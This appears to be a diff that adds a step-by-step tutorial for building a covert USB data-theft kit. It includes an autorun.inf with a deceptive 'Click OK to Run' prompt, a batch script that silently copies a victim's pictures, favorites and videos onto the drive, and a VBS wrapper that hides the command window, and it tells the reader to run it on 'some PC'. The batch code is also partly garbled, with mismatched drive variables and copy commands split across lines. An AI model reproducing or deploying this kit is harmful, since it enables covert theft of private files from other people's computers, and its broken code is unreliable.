@@ -1,0 +1,45 @@
+[1] Make autorun file, In notepad paste this code:
+
+$~ [autorun]
+icon=drive.ico
+open=launch.bat
+action=Click OK to Run
+shell\open\command=launch.bat
+
+>> Save this as a file as autorun.inf
+
+[2] Make batch file, In notepad paste this code:
+
+$~ @echo off
+:: variables
+/min
+SET odrive=%odrive:~0,2%
+set backupcmd=xcopy /s /c /d /e /h /i /r /y
+echo off
+%backupcmd% "%USERPROFILE%\pictures"
+"%drive%\all\My pics"
+%backupcmd% "%USERPROFILE%\Favorites"
+"%drive%\all\Favorites"
+%backupcmd% "%USERPROFILE%\videos"
+"%drive%\all\vids"
+@echo off
+cls
+
+>> Save as file.bat
+Copy in the USB and run in some PC!
+
+[3] Bonus! This code runs the file.bat as a process so it does not show the CMD prompt and everything the batch file is processing:
+
+$~ CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False
+
+>> Save this as invisible.vbs
+
+[4] Open Notepad one last time and copy-paste the following line:
+
+$~ wscript.exe \invisible.vbs file.bat
+
+>> save this as launch.bat
+Copy all 4 files created in the above steps and put them on the root of the Flash drive Also create a folder.
+
+~ Enjoy The Movement!
+
